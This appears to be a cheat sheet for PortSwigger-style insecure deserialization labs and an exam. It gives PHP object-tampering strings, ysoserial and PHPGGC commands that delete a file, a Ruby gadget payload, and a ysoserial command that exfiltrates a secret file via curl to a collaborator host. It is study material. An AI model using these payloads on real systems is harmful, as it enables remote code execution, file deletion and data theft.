# Insecure Deserialization - Stage 3

## 🎯 Overview

Insecure deserialization allows attackers to manipulate serialized objects to achieve RCE, privilege escalation, or file system access.

## 🛠️ Essential Tools

### Java Deserialization Scanner (Burp Extension)
- Detects Java deserialization vulnerabilities
- Identifies serialization library
- Essential for exam

### ysoserial
**Generate Java deserialization gadgets**

**Requirements:** Java JDK 11+

**Download:**
```bash
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
```

## 🔥 Attack Techniques

### PHP Deserialization

#### Basic Object Injection
**Serialized Object:**
```php
O:4:"User":2:{s:8:"username";s:6:"carlos";s:5:"admin";b:1;}
```

**Breakdown:**
- `O:4:"User"` - Object of class "User"
- `2:{}` - 2 properties
- `s:8:"username"` - String property "username"
- `s:6:"carlos"` - Value "carlos"
- `s:5:"admin"` - String property "admin"
- `b:1` - Boolean value true

#### Modify Serialized Data
**Original:**
```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```

**Modified (become admin):**
```
O:4:"User":2:{s:8:"username";s:6:"carlos";s:5:"admin";b:1;}
```

#### Magic Methods Exploitation
**Common PHP magic methods:**
- `__construct()` - Called on object creation
- `__destruct()` - Called on object destruction
- `__wakeup()` - Called on unserialize()
- `__toString()` - Called when object treated as string

**Example Gadget:**
```php
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

---

### Java Deserialization

#### Using ysoserial
**Generate gadget to delete file:**
```bash
java -jar ysoserial-all.jar CommonsCollections4 "rm /home/carlos/morale.txt" | base64 -w 0
```

**With gzip compression:**
```bash
java -jar ysoserial-all.jar CommonsCollections4 "rm /home/carlos/morale.txt" | gzip -f | base64 -w 0
```

**Read file and exfiltrate:**
```bash
java -jar ysoserial-all.jar CommonsCollections4 "curl http://burp.oastify.com/?c=\$(cat /home/carlos/secret | base64)" | base64 -w 0
```

#### Common Gadget Chains
- `CommonsCollections1-7`
- `Spring1-2`
- `Jdk7u21`
- `Hibernate1-2`

---

### Ruby Deserialization

#### Using Universal Gadget Chain
**Example payload:**
```ruby
"\x04\x08o:\x40ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\x09:\x0E@instanceo:\x08ERB\x08:\x09@srcI\"\x1E`rm /home/carlos/morale.txt`\x06:\x06ET:\x0C@filenameI\"\x061\x06;\x00T:\x0C@linenoi\x06:\x0C@method:\x0Bresult"
```

**Generate using:**
```ruby
require 'base64'
payload = Marshal.dump(gadget_chain)
puts Base64.encode64(payload)
```

---

## 📋 Lab Examples

### Lab 1: Modifying Serialized Data Types
**Cookie:**
```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"abc123..."}
```

**Modify to:**
```
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```
(Changed access_token from string to integer 0)

---

### Lab 2: Using Application Functionality
**Exploit `__destruct()` magic method:**
```php
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

---

### Lab 3: Arbitrary Object Injection (PHP)
**Inject object to delete file:**
```php
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

---

### Lab 4: Java Deserialization with Apache Commons
**Using ysoserial:**
```bash
java -jar ysoserial-all.jar CommonsCollections4 "rm /home/carlos/morale.txt" | base64 -w 0
```

---

### Lab 5: PHP Deserialization with Pre-Built Gadget Chain
**Using PHPGGC:**
```bash
phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0
```

---

### Lab 6: Ruby Deserialization
**Using documented gadget chain:**
```ruby
# Generate payload with Ruby gadget chain
```

---

## 🎓 Exam Tips

1. **Install Java Deserialization Scanner** - Detects Java serialization
2. **Use ysoserial** - Generate Java gadgets quickly
3. **Check cookies** - Serialized objects often in cookies
4. **Look for base64** - Serialized data usually base64-encoded
5. **Try modifying values** - Change admin flag, username, etc.
6. **Use gzip compression** - Some apps expect compressed serialized data
7. **Read file via RCE** - `cat /home/carlos/secret | base64`

## 🔍 Detection

### PHP Serialization
```
O:4:"User":2:{...}
a:2:{...}
```

### Java Serialization (Base64)
```
rO0AB...
```
(Starts with `rO0AB` when base64-encoded)

### Ruby Serialization
```
\x04\x08...
```

## 🔗 Quick Reference

| Language | Format | Tool |
|----------|--------|------|
| PHP | `O:4:"User":2:{...}` | Manual editing |
| Java | Binary (base64) | ysoserial |
| Ruby | Binary | Marshal |
| Python | `pickle` | Manual/scripts |
| .NET | Binary | ysoserial.net |

## 📚 References

- [PortSwigger Insecure Deserialization](https://portswigger.net/web-security/deserialization)
- [ysoserial](https://github.com/frohoff/ysoserial)
- [PHPGGC](https://github.com/ambionics/phpggc)
- [Java Deserialization Scanner](https://portswigger.net/bappstore/228336544ebe4e68824b5146dbbd93ae)
